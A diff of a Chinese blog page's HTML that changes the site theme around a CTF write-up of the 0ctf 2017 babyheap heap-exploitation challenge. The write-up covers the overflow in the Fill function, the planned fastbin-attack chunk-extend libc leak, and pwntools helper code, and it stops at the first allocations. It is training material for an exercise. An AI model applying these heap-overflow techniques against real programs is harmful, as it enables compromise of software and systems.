@@ -1,593 +1,228 @@
-<!DOCTYPE HTML>
-<html lang="zh-CN">
-
-
-<head>
+<!DOCTYPE html>
+<html>
+  <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="babyheap_0ctf_2017, L">
-    <meta name="description" content="这两天学习了一些堆的知识，趁热记录一下首先还是熟练的checksec保护全开，堆题正常操作IDA分析一波四个功能，增删查改依次进入每个功能查看，首先是Allocate功能最大分配16个size最大为4096个字节，通过calloc分配堆，c">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <meta name="renderer" content="webkit|ie-stand|ie-comp">
-    <meta name="mobile-web-app-capable" content="yes">
-    <meta name="format-detection" content="telephone=no">
-    <meta name="apple-mobile-web-app-capable" content="yes">
-    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <link rel="alternate" href="/LawlietLW.github.io/atom.xml" title="L" type="application/atom+xml" />
+    
+    
+    
+    <link rel="stylesheet" type="text/css" href="/LawlietLW.github.io/css/normalize.css">
+    <link rel="stylesheet" type="text/css" href="/LawlietLW.github.io/css/index.css">
+    
+    <link rel="stylesheet" type="text/css" href="/LawlietLW.github.io/css/sidebar.css">
+    
+    
+<link rel="stylesheet" type="text/css" href="/LawlietLW.github.io/css/page.css">
+<link rel="stylesheet" type="text/css" href="/LawlietLW.github.io/css/post.css">
+
+    <link rel="stylesheet" type="text/css" href="/LawlietLW.github.io/css/custom.css">
+    <link rel="stylesheet" type="text/css" href="/LawlietLW.github.io/css/%5Bobject%20Object%5D.css">
+    <link rel="stylesheet" type="text/css" href="/LawlietLW.github.io/css/lightgallery.min.css">
+    <script type="text/javascript" src="/LawlietLW.github.io/js/jquery.min.js"></script>
+    <script defer type="text/javascript" src="/LawlietLW.github.io/js/util.js"></script>
+    <script defer type="text/javascript" src="/LawlietLW.github.io/js/clipboard.min.js"></script>
+    <script defer type="text/javascript" src="/LawlietLW.github.io/js/scrollspy.js"></script>
+    <script defer type="text/javascript" src="/LawlietLW.github.io/js/fontawesome-all.min.js"></script>
+    <script defer type="text/javascript" src="/LawlietLW.github.io/js/lightgallery.min.js"></script>
+    <script defer type="text/javascript" src="/LawlietLW.github.io/js/lg-fullscreen.min.js"></script>
+    <script defer type="text/javascript" src="/LawlietLW.github.io/js/lg-hash.min.js"></script>
+    <script defer type="text/javascript" src="/LawlietLW.github.io/js/lg-pager.min.js"></script>
+    <script defer type="text/javascript" src="/LawlietLW.github.io/js/lg-thumbnail.min.js"></script>
+    <script defer type="text/javascript" src="/LawlietLW.github.io/js/lg-zoom.min.js"></script>
+    
+    
+    <script defer type="text/javascript" src="/LawlietLW.github.io/js/search.js"></script>
+    <script type="text/javascript">
+    $(document).ready(function () {
+      var searchPath = "search.xml";
+      if (searchPath.length === 0) {
+        searchPath = "search.xml";
+      }
+      var path = "/LawlietLW.github.io/" + searchPath;
+      searchFunc(path, "search-input", "search-result");
+    });
+    </script>
+    
+    
+    <script defer type="text/javascript" src="/LawlietLW.github.io/js/index.js"></script>
+    <script type="text/javascript">
+    $(document).ready(function () {
+      var cb = null;
+      var els = $(".post figure.highlight");
+      if (els.length) {
+        // Enabled Hexo highlight line number.
+        $(els).each(function (i, e) {
+          // $(e).before("<button class=\"copy button\">Copy</button>");
+          $(e).before([
+            "<div class=\"code-titlebar\">",
+              "<div class=\"titlebar-left\">",
+                "<button class=\"copy\" aria-label=\"Copy\"><i class=\"far fa-copy\"></i></button>",
+              "</div>",
+              "<div class=\"titlebar-center\">",
+                "code",
+              "</div>",
+              "<div class=\"titlebar-right\">",
+                "<button class=\"button-dot dot-minimize\" aria-label=\"Decoration\"></button>",
+                "<button class=\"button-dot dot-maximize\" aria-label=\"Decoration\"></button>",
+                "<button class=\"button-dot dot-close\" aria-label=\"Decoration\"></button>",
+              "</div>",
+            "</div>"
+          ].join(""));
+        });
+        cb = new ClipboardJS("button.copy", {
+          "target": function (trigger) {
+              // Get target element by DOM API.
+              return trigger.parentNode.parentNode.nextElementSibling.firstChild.firstChild.firstChild.lastChild.firstChild.firstChild;
+          }
+        });
+      } else {
+        // Disabled Hexo highlight line number.
+        els = $(".post pre code");
+        $(els).each(function (i, e) {
+          // Add button before pre, not code.
+          // $(e).parent().before("<button class=\"copy button\">Copy</button>");
+          $(e).before([
+            "<div class=\"code-titlebar\">",
+              "<div class=\"titlebar-left\">",
+                "<button class=\"copy\" aria-label=\"Copy\"><i class=\"far fa-copy\"></i></button>",
+              "</div>",
+              "<div class=\"titlebar-center\">",
+                "code",
+              "</div>",
+              "<div class=\"titlebar-right\">",
+                "<button class=\"button-dot dot-minimize\" aria-label=\"Decoration\"></button>",
+                "<button class=\"button-dot dot-maximize\" aria-label=\"Decoration\"></button>",
+                "<button class=\"button-dot dot-close\" aria-label=\"Decoration\"></button>",
+              "</div>",
+            "</div>"
+          ].join(""));
+        });
+        cb = new ClipboardJS("button.copy", {
+          "target": function (trigger) {
+              // Get target element by DOM API.
+              return trigger.parentNode.parentNode.nextElementSibling;
+          }
+        });
+      }
+      cb.on("success", function (e) {
+        e.clearSelection();
+        var trigger = e.trigger;
+        // Change button text as a user tip.
+        trigger.innerHTML = "<i class=\"far fa-check-square\"></i>";
+        $(trigger).addClass("copied");
+        // Change button text back;
+        setTimeout(function () {
+          trigger.innerHTML = "<i class=\"far fa-copy\"></i>";
+          $(trigger).removeClass("copied");
+        }, 1500);
+      });
+    });
+    </script>
+    
+    <script defer type="text/javascript" src="/LawlietLW.github.io/js/custom.js"></script>
     <title>babyheap_0ctf_2017 | L</title>
-    <link rel="icon" type="image/png" href="/favicon.png">
-
-    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
-    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
-    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
-    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
-    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
-    <link rel="stylesheet" type="text/css" href="/css/matery.css">
-    <link rel="stylesheet" type="text/css" href="/css/my.css">
+  <meta name="generator" content="Hexo 4.1.1"><link rel="stylesheet" href="/LawlietLW.github.io/css/prism-tomorrow.css" type="text/css"></head>
+  <body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN"  data-spy="scroll" data-target=".list-group">
     
-    <script src="/libs/jquery/jquery.min.js"></script>
-    
-<meta name="generator" content="Hexo 4.1.1"><link rel="alternate" href="/LawlietLW.github.io/atom.xml" title="L" type="application/atom+xml">
-<link rel="stylesheet" href="/LawlietLW.github.io/css/prism-tomorrow.css" type="text/css"></head>
-
-
-<body>
-    <header class="navbar-fixed">
-    <nav id="headNav" class="bg-color nav-transparent">
-        <div id="navContainer" class="nav-wrapper head-container">
-            <div class="brand-logo">
-                <a href="/LawlietLW.github.io/" class="waves-effect waves-light">
-                    
-                    <img src="/medias/1.png" class="logo-img" alt="LOGO">
-                    
-                    <span class="logo-span">L</span>
-                </a>
-            </div>
-            
-
-<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
-<ul class="right nav-menu">
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/" class="waves-effect waves-light">
+<header id="header" class="header">
+  <div class="container">
+    <div class="header-container">
+      <div class="header-title">
+        <h1 class="title"><a href="/LawlietLW.github.io/">L</a></h1>
+        <h2 class="subtitle"></h2>
+      </div>
       
-      <i class="fas fa-home" style="zoom: 0.6;"></i>
-      
-      <span>首页</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/tags" class="waves-effect waves-light">
-      
-      <i class="fas fa-tags" style="zoom: 0.6;"></i>
-      
-      <span>标签</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/categories" class="waves-effect waves-light">
-      
-      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
-      
-      <span>分类</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/archives" class="waves-effect waves-light">
-      
-      <i class="fas fa-archive" style="zoom: 0.6;"></i>
-      
-      <span>归档</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/about" class="waves-effect waves-light">
-      
-      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
-      
-      <span>关于</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/contact" class="waves-effect waves-light">
-      
-      <i class="fas fa-comments" style="zoom: 0.6;"></i>
-      
-      <span>留言板</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/friends" class="waves-effect waves-light">
-      
-      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
-      
-      <span>友情链接</span>
-    </a>
-    
-  </li>
-  
-  <li>
-    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
-      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
-    </a>
-  </li>
-</ul>
-
-<div id="mobile-nav" class="side-nav sidenav">
-
-    <div class="mobile-head bg-color">
-        
-        <img src="/medias/1.png" class="logo-img circle responsive-img">
-        
-        <div class="logo-name">L</div>
-        <div class="logo-desc">
-            
-            Never really desperate, only the lost of the soul.
-            
-        </div>
     </div>
-
-    
-
-    <ul class="menu-list mobile-menu-list">
+    <nav id="nav" class="nav">
+      <a id="nav-toggle" class="nav-toggle" aria-hidden="true"><i class="fas fa-bars" aria-label="Toggle Navbar"></i></a>
+      <ul id="menu" role="menubar" aria-hidden="false">
         
-        <li class="m-nav-item">
-	  
-		<a href="/" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-home"></i>
-			
-			首页
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/tags" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-tags"></i>
-			
-			标签
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/categories" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-bookmark"></i>
-			
-			分类
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/archives" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-archive"></i>
-			
-			归档
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/about" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-user-circle"></i>
-			
-			关于
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/contact" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-comments"></i>
-			
-			留言板
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/friends" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-address-book"></i>
-			
-			友情链接
-		</a>
-          
-        </li>
-        
-        
-    </ul>
-</div>
-
-        </div>
-
-        
+      </ul>
     </nav>
-
+  </div>
 </header>
 
-    
 
-
-
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/7.jpg')">
-    <div class="container" style="right: 0px;left: 0px;">
-        <div class="row">
-            <div class="col s12 m12 l12">
-                <div class="brand">
-                    <h1 class="description center-align post-title">babyheap_0ctf_2017</h1>
-                </div>
-            </div>
-        </div>
+    <main id="main" class="main">
+      <div class="container">
+        <div class="main-container">
+          <div class="content">
+            
+<div id="post" class="page">
+  
+  <article class="article post card" itemscope itemtype="http://schema.org/Article">
+    <div class="post-block">
+      <link itemprop="mainEntityOfPage" href="http://LawlietLW.github.io/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/">
+      <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+       <meta itemprop="name" content="Lock">
+       <meta itemprop="description" content="">
+       <meta itemprop="image" content="/LawlietLW.github.io/">
+      </span>
+      <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+       <meta itemprop="name" content="L">
+      </span>
     </div>
-</div>
+    <header class="post-header">
+      <h1 class="post-title" itemprop="name headline">babyheap_0ctf_2017</h1>
+      <div class="post-meta">
+        
+        <span class="post-date">
+          <i class="far fa-calendar-plus"></i><span><time title="post-date" itemprop="dateCreated datePublished" datetime="2020-02-01T10:17:37+08:00">2020-02-01 10:17:37</time></span>
+        </span>
+        
+        
+        
+        <span class="post-meta-divider divider">|</span>
+        
+        <span class="post-categories">
+          
+          <i class="far fa-folder-open"></i><span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/LawlietLW.github.io/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a></span>
+        </span>
+        
+        
+      </div>
+    </header>
+    <main class="post-main" itemprop="articleBody">
+      <p>这两天学习了一些堆的知识，趁热记录一下<br>首先还是熟练的checksec<br><img src="/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/1.jpg" alt=""><br>保护全开，堆题正常操作<br>IDA分析一波<br><img src="/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/2.jpg" alt=""><br>四个功能，增删查改<br>依次进入每个功能查看，首先是Allocate功能<br><img src="/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/3.jpg" alt=""><br>最大分配16个<br>size最大为4096个字节，通过calloc分配堆，calloc与malloc的区别在于<br>calloc 会将分配的内存空间每一位都初始化为0<br><img src="/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/4.jpg" alt=""><br>这三行代码分别代表flag位，分配即被置1；分配的字节大小；所分配的堆的指针<br>所以转换成结构体即为</p>
+<figure class="hljs highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre class=" language-hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span>{</span><br>    <span class="hljs-keyword">int</span> flag;<br>    <span class="hljs-keyword">int</span> lenth;<br>    <span class="hljs-keyword">char</span>*content;<br>}note[<span class="hljs-number"><code class="language-hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span>{</span><br>    <span class="hljs-keyword">int</span> flag;<br>    <span class="hljs-keyword">int</span> lenth;<br>    <span class="hljs-keyword">char</span>*content;<br>}note[<span class="hljs-number">16</span>]<br></code></pre></td></tr></tbody></table></figure>
 
-
-
-
-<main class="post-container content">
-
-    
-    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
-<style>
-    #articleContent h1::before,
-    #articleContent h2::before,
-    #articleContent h3::before,
-    #articleContent h4::before,
-    #articleContent h5::before,
-    #articleContent h6::before {
-        display: block;
-        content: " ";
-        height: 100px;
-        margin-top: -100px;
-        visibility: hidden;
-    }
-
-    #articleContent :focus {
-        outline: none;
-    }
-
-    .toc-fixed {
-        position: fixed;
-        top: 64px;
-    }
-
-    .toc-widget {
-        width: 345px;
-        padding-left: 20px;
-    }
-
-    .toc-widget .toc-title {
-        margin: 35px 0 15px 0;
-        padding-left: 17px;
-        font-size: 1.5rem;
-        font-weight: bold;
-        line-height: 1.5rem;
-    }
-
-    .toc-widget ol {
-        padding: 0;
-        list-style: none;
-    }
-
-    #toc-content {
-        height: calc(100vh - 250px);
-        overflow: auto;
-    }
-
-    #toc-content ol {
-        padding-left: 10px;
-    }
-
-    #toc-content ol li {
-        padding-left: 10px;
-    }
-
-    #toc-content .toc-link:hover {
-        color: #42b983;
-        font-weight: 700;
-        text-decoration: underline;
-    }
-
-    #toc-content .toc-link::before {
-        background-color: transparent;
-        max-height: 25px;
-    }
-
-    #toc-content .is-active-link {
-        color: #42b983;
-    }
-
-    #toc-content .is-active-link::before {
-        background-color: #42b983;
-    }
-
-    #floating-toc-btn {
-        position: fixed;
-        right: 15px;
-        bottom: 76px;
-        padding-top: 15px;
-        margin-bottom: 0;
-        z-index: 998;
-    }
-
-    #floating-toc-btn .btn-floating {
-        width: 48px;
-        height: 48px;
-    }
-
-    #floating-toc-btn .btn-floating i {
-        line-height: 48px;
-        font-size: 1.4rem;
-    }
-</style>
-<div class="row">
-    <div id="main-content" class="col s12 m12 l9">
-        <!-- 文章内容详情 -->
-<div id="artDetail">
-    <div class="card">
-        <div class="card-content article-info">
-            <div class="row tag-cate">
-                <div class="col s7">
-                    
-                    <div class="article-tag">
-                        
-                            <a href="/LawlietLW.github.io/tags/pwn/">
-                                <span class="chip bg-color">pwn</span>
-                            </a>
-                        
-                            <a href="/LawlietLW.github.io/tags/%E5%A0%86/">
-                                <span class="chip bg-color">堆</span>
-                            </a>
-                        
-                            <a href="/LawlietLW.github.io/tags/fastbin-attack/">
-                                <span class="chip bg-color">fastbin attack</span>
-                            </a>
-                        
-                            <a href="/LawlietLW.github.io/tags/chunk-extend/">
-                                <span class="chip bg-color">chunk extend</span>
-                            </a>
-                        
-                    </div>
-                    
-                </div>
-                <div class="col s5 right-align">
-                    
-                    <div class="post-cate">
-                        <i class="fas fa-bookmark fa-fw icon-category"></i>
-                        
-                            <a href="/LawlietLW.github.io/categories/CTF/" class="post-category">
-                                CTF
-                            </a>
-                        
-                    </div>
-                    
-                </div>
-            </div>
-
-            <div class="post-info">
-                
-                <div class="post-date info-break-policy">
-                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-02-01
-                </div>
-                
-
-                
-                <div class="post-date info-break-policy">
-                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2020-02-01
-                </div>
-                
-
-                
-                <div class="info-break-policy">
-                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.5k
-                </div>
-                
-
-                
-                <div class="info-break-policy">
-                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    6 分
-                </div>
-                
-
-                
-                    <div id="busuanzi_container_page_pv" class="info-break-policy">
-                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
-                        <span id="busuanzi_value_page_pv"></span>
-                    </div>
-				
-            </div>
-
-        </div>
-        <hr class="clearfix">
-        <div class="card-content article-card-content">
-            <div id="articleContent">
-                <p>这两天学习了一些堆的知识，趁热记录一下<br>首先还是熟练的checksec<br><img src="/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/1.jpg" alt=""><br>保护全开，堆题正常操作<br>IDA分析一波<br><img src="/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/2.jpg" alt=""><br>四个功能，增删查改<br>依次进入每个功能查看，首先是Allocate功能<br><img src="/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/3.jpg" alt=""><br>最大分配16个<br>size最大为4096个字节，通过calloc分配堆，calloc与malloc的区别在于<br>calloc 会将分配的内存空间每一位都初始化为0<br><img src="/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/4.jpg" alt=""><br>这三行代码分别代表flag位，分配即被置1；分配的字节大小；所分配的堆的指针<br>所以转换成结构体即为</p>
-<pre class=" language-c"><code class="language-c"><span class="token keyword">struct</span><span class="token punctuation">{</span>
-    <span class="token keyword">int</span> flag<span class="token punctuation">;</span>
-    <span class="token keyword">int</span> lenth<span class="token punctuation">;</span>
-    <span class="token keyword">char</span><span class="token operator">*</span>content<span class="token punctuation">;</span>
-<span class="token punctuation">}</span>note<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span></code></pre>
 <p>再看到Fill功能<br><img src="/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/5.jpg" alt=""><br>首先判断输入的index是否位于0到15之间并且是否被分配<br>如果是的话则输入content的size<br>漏洞点就在这里，程序并没有判断content的size是否小于我们之前输入的堆的size，如果我们输入更大的size，就可以造成堆溢出</p>
 <p>再看到Free功能<br><img src="/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/6.jpg" alt=""><br>一开始还是先判断是否存在<br>然后清零所有的数据，并且指针也置NULL<br>free功能并没有漏洞</p>
 <p>最后一个dump功能<br><img src="/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/7.jpg" alt=""><br>和上面一样，先判断，然后打印对应序号的堆的内容，没啥问题</p>
 <p>功能分析完后就开始分析漏洞点<br>Fill功能存在堆溢出漏洞，而free功能既没有UAF漏洞也没有double free漏洞，所以这题不能利用常规的通过unsorted bin来泄露libc地址的方法，而是要利用fastbin attack中的一种叫做chunk extend的方法来泄露地址，在这里贴上我看到的一个讲解的很好的链接<a href="https://blog.csdn.net/Breeze_CAT/article/details/103788698" target="_blank" rel="noopener">fastbin attack详解</a><br>首先把重复操作封装成函数</p>
-<pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">alloc</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Command: "</span><span class="token punctuation">)</span>
-    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>
-    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Size: "</span><span class="token punctuation">)</span>
-    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
-
-
-<span class="token keyword">def</span> <span class="token function">fill</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Command: "</span><span class="token punctuation">)</span>
-    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>
-    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Index: "</span><span class="token punctuation">)</span>
-    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
-    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Size: "</span><span class="token punctuation">)</span>
-    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>len<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Content: "</span><span class="token punctuation">)</span>
-    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span>
-
-<span class="token keyword">def</span> <span class="token function">free</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Command: "</span><span class="token punctuation">)</span>
-    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>
-    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Index: "</span><span class="token punctuation">)</span>
-    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
-
-<span class="token keyword">def</span> <span class="token function">dump</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Command: "</span><span class="token punctuation">)</span>
-    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'4'</span><span class="token punctuation">)</span>
-    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Index: "</span><span class="token punctuation">)</span>
-    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
-    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Content: \n"</span><span class="token punctuation">)</span>
-    data<span class="token operator">=</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
-    <span class="token keyword">return</span> data</code></pre>
+<figure class="hljs highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre class=" language-hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">alloc</span><span class="hljs-params">(size)</span>:</span><br>    io.recvuntil(<span class="hljs-string">"Command: "</span>)<br>    io.sendline(<span class="hljs-string">'1'</span>)<br>    io.recvuntil(<span class="hljs-string">"Size: "</span>)<br>    io.sendline(str(size))<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fill</span><span class="hljs-params">(index, content)</span>:</span><br>    io.recvuntil(<span class="hljs-string">"Command: "</span>)<br>    io.sendline(<span class="hljs-string">'2'</span>)<br>    io.recvuntil(<span class="hljs-string">"Index: "</span>)<br>    io.sendline(str(index))<br>    io.recvuntil(<span class="hljs-string">"Size: "</span>)<br>    io.sendline(str(len(content)))<br>    io.recvuntil(<span class="hljs-string">"Content: "</span>)<br>    io.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(index)</span>:</span><br>    io.recvuntil(<span class="hljs-string">"Command: "</span>)<br>    io.sendline(<span class="hljs-string">'3'</span>)<br>    io.recvuntil(<span class="hljs-string">"Index: "</span>)<br>    io.sendline(str(index))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dump</span><span class="hljs-params">(index)</span>:</span><br>    io.recvuntil(<span class="hljs-string">"Command: "</span>)<br>    io.sendline(<span class="hljs-string">'4'</span>)<br>    io.recvuntil(<span class="hljs-string">"Index: "</span>)<br>    io.sendline(str(index))<br>    io.recvuntil(<span class="hljs-string">"Content: \n"</span>)<br>    data=io.recvline()<br>    <span class="hljs-keyword"><code class="language-hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">alloc</span><span class="hljs-params">(size)</span>:</span><br>    io.recvuntil(<span class="hljs-string">"Command: "</span>)<br>    io.sendline(<span class="hljs-string">'1'</span>)<br>    io.recvuntil(<span class="hljs-string">"Size: "</span>)<br>    io.sendline(str(size))<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fill</span><span class="hljs-params">(index, content)</span>:</span><br>    io.recvuntil(<span class="hljs-string">"Command: "</span>)<br>    io.sendline(<span class="hljs-string">'2'</span>)<br>    io.recvuntil(<span class="hljs-string">"Index: "</span>)<br>    io.sendline(str(index))<br>    io.recvuntil(<span class="hljs-string">"Size: "</span>)<br>    io.sendline(str(len(content)))<br>    io.recvuntil(<span class="hljs-string">"Content: "</span>)<br>    io.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(index)</span>:</span><br>    io.recvuntil(<span class="hljs-string">"Command: "</span>)<br>    io.sendline(<span class="hljs-string">'3'</span>)<br>    io.recvuntil(<span class="hljs-string">"Index: "</span>)<br>    io.sendline(str(index))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dump</span><span class="hljs-params">(index)</span>:</span><br>    io.recvuntil(<span class="hljs-string">"Command: "</span>)<br>    io.sendline(<span class="hljs-string">'4'</span>)<br>    io.recvuntil(<span class="hljs-string">"Index: "</span>)<br>    io.sendline(str(index))<br>    io.recvuntil(<span class="hljs-string">"Content: \n"</span>)<br>    data=io.recvline()<br>    <span class="hljs-keyword">return</span> data<br></code></pre></td></tr></tbody></table></figure>
 <p>在本题中，按照攻击思想，首先alloc4个堆</p>
-<pre class=" language-python"><code class="language-python">alloc<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#0</span>
-alloc<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#1</span>
-alloc<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#2</span>
-alloc<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#3</span></code></pre>
